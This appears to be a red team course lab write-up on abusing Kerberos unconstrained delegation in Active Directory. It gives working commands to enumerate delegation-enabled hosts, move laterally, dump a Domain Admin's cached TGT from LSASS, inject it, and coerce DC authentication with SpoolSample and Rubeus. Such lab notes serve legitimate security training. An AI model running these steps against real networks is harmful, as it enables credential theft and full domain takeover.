# CRTO — Unconstrained Delegation Lab

**Course:** Red Team Ops (CRTO) by RastaMouse — Zero Point Security
**Lab:** Unconstrained Delegation
**Objective:** Abuse unconstrained delegation on a workstation to capture a Domain Admin's TGT and impersonate them across the network

---

## The Full Chain

```
ldapsearch → find computers with unconstrained delegation (UAC bit 524288)
    ↓
Identify lon-ws-1$ (non-DC machine with unconstrained delegation — viable target)
    ↓
Impersonate rsteel → lateral move to lon-ws-1 (SCShell/psexec via AdminTo edge)
    ↓
krb_triage → spot dyork's TGT cached on lon-ws-1
    ↓
Confirm dyork is Domain Admin via ldapsearch
    ↓
krb_dump /user:dyork /service:krbtgt → extract DA TGT
    ↓
make_token + kerberos_ticket_use → impersonate dyork
    ↓
ls \\lon-dc-1\c$ → access DC as Domain Admin
```

---

## How Unconstrained Delegation Works

When a computer is configured for unconstrained delegation, **any user who authenticates to a service on that machine sends their full TGT** — not just a service ticket. The machine can then use that TGT to impersonate the user to any other service in the domain.

```
dyork authenticates to a service on lon-ws-1
    ↓
Windows sends dyork's TGT to lon-ws-1 as part of the authentication
    ↓
lon-ws-1 caches the TGT in LSASS memory
    ↓
Attacker on lon-ws-1 (as SYSTEM) extracts the cached TGT via krb_dump
    ↓
TGT used to impersonate dyork to any service — including DC admin shares
```

> **Why DCs are excluded:** Domain Controllers always have unconstrained delegation enabled — it's required for Kerberos infrastructure. They are not a viable attack path because you'd need DA to get on a DC in the first place.

---

## Step 1 — Enumerate Unconstrained Delegation

```bash
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName
```

### Filter Breakdown

| Component | Meaning |
|---|---|
| `samAccountType=805306369` | Computer accounts only (`SAM_MACHINE_ACCOUNT`) |
| `userAccountControl:1.2.840.113556.1.4.803:=524288` | Bitwise AND — UAC flag `524288` = `TRUSTED_FOR_DELEGATION` (unconstrained delegation enabled) |

**UAC Bit Reference for Delegation:**

| UAC Value | Hex | Flag | Meaning |
|---|---|---|---|
| `524288` | `0x80000` | `TRUSTED_FOR_DELEGATION` | Unconstrained delegation |
| `16777216` | `0x1000000` | `TRUSTED_TO_AUTH_FOR_DELEGATION` | Constrained delegation (S4U2Self) |
| `1048576` | `0x100000` | `NOT_DELEGATED` | Account cannot be delegated |

**Expected results:**
```
lon-dc-1$   ← DC — always has unconstrained delegation, not a viable target
lon-ws-1$   ← Workstation — non-DC with unconstrained delegation, viable attack path
```

**TTP:** T1018 — Remote System Discovery
**TTP:** T1069.002 — Permission Groups Discovery

---

## Step 2 — Lateral Move to lon-ws-1

```bash
# Impersonate rsteel (has AdminTo on lon-ws-1 via Workstation Admins GPO)
steal_token [rsteel_pid]          # or make_token CONTOSO\rsteel Passw0rd!

# Set spawnto
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

# Move laterally
jump scshell64 lon-ws-1 smb      # or psexec64
```

> This is the same lateral movement chain from the Lateral Movement lab — rsteel's `AdminTo` edge on lon-ws-1 (established via the Workstation Admins GPO) is what makes this possible. BloodHound would show this path clearly.

---

## Step 3 — Triage Tickets on lon-ws-1

From the new SYSTEM Beacon on lon-ws-1:

```bash
krb_triage
```

Look for:
```
dyork @ CONTOSO.COM | krbtgt/CONTOSO.COM
```

> dyork authenticated to something on lon-ws-1 (e.g. a network share, a service) and their TGT was cached by the unconstrained delegation mechanism. It now sits in LSASS memory, accessible to SYSTEM.

**Why TGTs accumulate on unconstrained delegation machines:**
Every domain user who authenticates to lon-ws-1 leaves their TGT behind. On busy machines (file servers, workstations used by admins) these accumulate over time — making unconstrained delegation targets increasingly valuable the longer an engagement runs.

---

## Step 4 — Confirm dyork is Domain Admin

```bash
ldapsearch samAccountName=dyork --attributes memberOf
```

Expected output includes:
```
memberOf: CN=Domain Admins,CN=Users,DC=contoso,DC=com
```

> Always verify before using a TGT — there's no point impersonating a user who doesn't have the access you need. Confirm DA membership before dumping.

---

## Step 5 — Dump dyork's TGT

```bash
krb_dump /user:dyork /service:krbtgt
```

Save the base64 output — this is dyork's TGT, valid for the remainder of its 10-hour lifetime.

---

## Step 6 — Impersonate dyork and Access DC

```bash
# Save ticket to disk
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\dyork.kirbi", [Convert]::FromBase64String("[B64 TICKET]"))

# Create sacrificial logon session
make_token CONTOSO\dyork FakePass

# Inject TGT
kerberos_ticket_use C:\Users\Attacker\Desktop\dyork.kirbi

# Verify
run klist

# Access DC admin share — confirms DA-level access
ls \\lon-dc-1\c$
```

> Successful `ls \\lon-dc-1\c$` confirms you are operating as a Domain Admin. From here: DCSync, Golden Ticket, domain persistence — the domain is fully compromised.

---

## Unconstrained vs Constrained vs Resource-Based Delegation

| Type | UAC Flag | TGT Sent? | Attacker Value |
|---|---|---|---|
| **Unconstrained** | `TRUSTED_FOR_DELEGATION` | Yes — full TGT cached | Highest — steal any user's TGT |
| **Constrained** | `TRUSTED_TO_AUTH_FOR_DELEGATION` | No — only TGS for allowed services | Medium — S4U2Self/S4U2Proxy abuse |
| **Resource-Based (RBCD)** | Set on resource, not requestor | No | High — writable `msDS-AllowedToActOnBehalfOfOtherIdentity` |

---

## Printer Bug / Coerce Attack (Real Engagement Context)

In a real engagement you may land on a machine with unconstrained delegation but no high-value TGTs currently cached. The standard technique is to **coerce** a DA or DC to authenticate to you:

```bash
# SpoolSample / PrinterBug — coerce DC to authenticate to lon-ws-1
# Rubeus monitor mode — watch for incoming TGTs in real time
execute-assembly Rubeus.exe monitor /interval:5 /nowrap

# Trigger coercion (from another Beacon or attacker machine)
SpoolSample.exe lon-dc-1 lon-ws-1
```

> This forces the DC's machine account to authenticate to lon-ws-1 — delivering the DC's TGT. With a DC TGT you can perform a DCSync via S4U2Self. The lab has dyork's TGT pre-cached for simplicity, but the coercion technique is the real-world equivalent.

---

## MITRE ATT&CK Mapping

| TTP | Technique | Detail |
|---|---|---|
| T1558.001 | Steal or Forge Kerberos Tickets | Dump cached TGT from LSASS via krb_dump |
| T1550.003 | Pass the Ticket | Inject dyork's TGT into sacrificial session |
| T1078.002 | Valid Accounts: Domain Accounts | Impersonate dyork with stolen TGT |
| T1018 | Remote System Discovery | LDAP enumeration of delegation-configured computers |

---

## Key Takeaways

- UAC bit `524288` (`TRUSTED_FOR_DELEGATION`) is the LDAP filter for unconstrained delegation — always filter to computers only (`samAccountType=805306369`) to exclude users
- **DCs always have unconstrained delegation** — they are not a viable target; look for non-DC machines with this flag
- TGTs accumulate on unconstrained delegation machines over time — the longer the machine has been up, the more tickets may be cached
- Always `ldapsearch memberOf` to confirm the target user's group memberships before dumping their ticket
- The real-world technique combines unconstrained delegation with **coercion** (PrinterBug, PetitPotam, etc.) — don't wait for a TGT to appear organically
- Successful `ls \\lon-dc-1\c$` as an impersonated DA = domain fully compromised — DCSync is the next logical step
- TGT lifetime is 10 hours — plan your post-exploitation window accordingly
